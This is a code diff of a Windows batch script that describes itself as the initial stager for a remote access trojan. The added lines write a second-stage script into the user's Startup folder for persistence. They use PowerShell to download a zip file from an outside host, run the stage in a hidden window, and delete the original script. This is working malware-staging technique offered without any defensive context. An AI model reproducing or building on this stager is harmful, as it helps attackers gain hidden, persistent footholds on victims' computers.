@@ -3,16 +3,20 @@
 @rem initial stager for the rat
 
 set InitialPath=%cd%
+set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 
 @rem go to startup
-cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
-
+cd %StartupDir%
 
 @rem generate payload
-(echo MsgBox "YOU ARE DOOMED!" ^& vbCrLf ^& "NOT WORTH IT", vbOkOnly+vbExclamation+vbDefaultButton1, "TITLE")>popup.vbs
+(echo powershell -c "iwr -uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -outfile '.\popsip.zip'")>stage2.cmd
+
+@rem run the payload
+powershell start-process powershell.exe -windowstyle hidden ".\stage2.cmd"
 
 @rem move back to saved directory
-cd "%InitialPath%"
+cd %InitialPath%
+
 del initial.cmd
 
 @REM (
